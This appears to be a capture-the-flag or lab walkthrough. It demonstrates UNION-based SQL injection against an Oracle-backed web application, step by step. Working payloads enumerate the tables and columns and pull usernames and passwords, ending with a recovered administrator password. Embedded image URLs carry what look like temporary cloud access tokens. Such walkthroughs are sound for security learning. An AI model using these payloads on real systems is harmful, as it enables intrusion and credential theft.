# Listing the database contents on Oracle database.

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--
```

![](https://miro.medium.com/v2/resize:fit:700/0*RPJRor8IdZC7Ib_t)

```text
' ORDER BY 2--
```

![](https://miro.medium.com/v2/resize:fit:700/0*_T6LLNa9qwkWRm-g)

```text
' ORDER BY 3--
```

![](https://miro.medium.com/v2/resize:fit:700/0*6o_cR09enYU_U8PS)

```text
' ORDER BY 3--                           → Returns an error message.
```

**Therefore there are 2 columns returned by the original query.**

**STEP #2**

Discover the column that contains the data type string.

**NOTE**

`' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**

![](https://miro.medium.com/v2/resize:fit:700/0*ZSORyG6-bFJm5eky)

```text
' UNION SELECT 'a', NULL FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*4xkIIOJbvVxq6rWg)

```text
' UNION SELECT NULL, 'a' FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*bxnCaG6WLBhuYcAp)

```text
' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
```

Therefore both column 1 and 2 contain that data type string.

**STEP #3**

Determine the table names.

```text
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
```

![](https://miro.medium.com/v2/resize:fit:700/0*0CxW812qQQf9_TiW)

Let’s find a table which contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*4NHKFGCB_bT_Qigx)

Table name: `USERS_KDXGKJ`

**STEP #4**

Determine the column names of the table** **`USERS_KDXGKJ`**.**

```text
' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e308f541-4e56-4255-bd10-524cee85e1b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666WGHAQ55%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221804Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCH3HG3UpXBDYw3d8MT3mCvweSs65G6QmXYy5Tq4aNbNUCIHHuANYah0NuoW%2F9MhA6dtmKdpA0T9Pn4oJaynMUL3ljKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwrqO7VV32QtXg3J2Iq3AMg8o%2BJFbYQOGDDemj0PTWvoXDoRd6XBXMoKi8BJRW2uszC3504bFhQOWK%2FeJJB0CH2Gt3uCvIonSAJEjNlJ2M2FtrBTZ6V8Oys5aGQ78AYy9iF9T0zONoQAPz6TqkUd6HzJWc%2Fwc69ZLQ4kRhn%2BNGHHQdlyE%2FDWrwFHlTmj0My9%2FZuhpXpd3hCSrkbq0JkgFvdQJK7MEfVUFcIddtxArDTdCTjRpZXquCXCPx8BE%2F5Cf6wrSoBzRLkypiQATg%2BbXjERwUTfSrX1%2Fhhu%2Bj1%2F0K5pxRWrbRVBkiA%2B4vuRFWnMcObawB56htsKgrxuNf1gZ9V%2Bvh5zNqm61EVD66JkF%2BIioOTKXPtWIM9L7F%2FoOsI2oi05z4bB1LIwAT6tLa78l73scS7AjpDvBrZZaCLuww4AIrABQfbU8w%2FM2eRadDBs48JGSZTx%2F35%2F5FyWUmoYeF0OC5dqrpResHvHU8f6Jiif1Da3XdAcdvSPYhtLvSnHgH0voS8mcV2Ord%2BQhzPuPYONjT66MUc%2BITa6dH7QD7Mas5E1UYn3H%2B2dpogksL6uoa%2FhKLN5meYNncUv9Y5KCTKodEoTwISuA7A5xjnuvTXNFHhtB7Z2JAnrIAfXhAxT9k2bdGFgLfwW%2FcI2jCEhKPUBjqnATnZg7UJOSb%2FLWUyRB4J9amL5cw5rfW%2Fr8g4DyVfVL7rcsfLkBeIxPBv%2BrNFxZVdaAF4uGUMlxikihusUqSDRvYK8Mt%2F3%2Ftn5Z4jycVRMkN12VHdNqXZeJaJKKI6lsgMvKER4ommXEyVtvwQpzVW8t01O77qcR6qR5x%2Fn401KLjTnFBFoGVvWyawIErgYKa%2FGWlghcHyoEcJp6ZQUIwOl%2FKrt9MzSQeu&X-Amz-Signature=af60d6e63d8a7eef688d63d0bb600095175b00ba0bdacb7648061d3bfaed6f73&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`USERS_KDXGKJ`**.**

`username: USERNAME_CSUMYK`

`password: PASSWORD_AIOQBO`

---

**STEP #5**

Retrieve the administrator user’s password from the database.

```text
' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3ab7ff68-30f8-4bf2-937a-fe782827a0b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666WGHAQ55%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221804Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCH3HG3UpXBDYw3d8MT3mCvweSs65G6QmXYy5Tq4aNbNUCIHHuANYah0NuoW%2F9MhA6dtmKdpA0T9Pn4oJaynMUL3ljKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwrqO7VV32QtXg3J2Iq3AMg8o%2BJFbYQOGDDemj0PTWvoXDoRd6XBXMoKi8BJRW2uszC3504bFhQOWK%2FeJJB0CH2Gt3uCvIonSAJEjNlJ2M2FtrBTZ6V8Oys5aGQ78AYy9iF9T0zONoQAPz6TqkUd6HzJWc%2Fwc69ZLQ4kRhn%2BNGHHQdlyE%2FDWrwFHlTmj0My9%2FZuhpXpd3hCSrkbq0JkgFvdQJK7MEfVUFcIddtxArDTdCTjRpZXquCXCPx8BE%2F5Cf6wrSoBzRLkypiQATg%2BbXjERwUTfSrX1%2Fhhu%2Bj1%2F0K5pxRWrbRVBkiA%2B4vuRFWnMcObawB56htsKgrxuNf1gZ9V%2Bvh5zNqm61EVD66JkF%2BIioOTKXPtWIM9L7F%2FoOsI2oi05z4bB1LIwAT6tLa78l73scS7AjpDvBrZZaCLuww4AIrABQfbU8w%2FM2eRadDBs48JGSZTx%2F35%2F5FyWUmoYeF0OC5dqrpResHvHU8f6Jiif1Da3XdAcdvSPYhtLvSnHgH0voS8mcV2Ord%2BQhzPuPYONjT66MUc%2BITa6dH7QD7Mas5E1UYn3H%2B2dpogksL6uoa%2FhKLN5meYNncUv9Y5KCTKodEoTwISuA7A5xjnuvTXNFHhtB7Z2JAnrIAfXhAxT9k2bdGFgLfwW%2FcI2jCEhKPUBjqnATnZg7UJOSb%2FLWUyRB4J9amL5cw5rfW%2Fr8g4DyVfVL7rcsfLkBeIxPBv%2BrNFxZVdaAF4uGUMlxikihusUqSDRvYK8Mt%2F3%2Ftn5Z4jycVRMkN12VHdNqXZeJaJKKI6lsgMvKER4ommXEyVtvwQpzVW8t01O77qcR6qR5x%2Fn401KLjTnFBFoGVvWyawIErgYKa%2FGWlghcHyoEcJp6ZQUIwOl%2FKrt9MzSQeu&X-Amz-Signature=0e6eb17809b2bc6fd1cc69b52cf6b5586473a8c8bbbdfa0c0882bd5839691de0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

|  |  |
|---|---|
| administrator | r1xyd5uo3kcovvqm73jl |

Use the password to get administrators access to the web application.
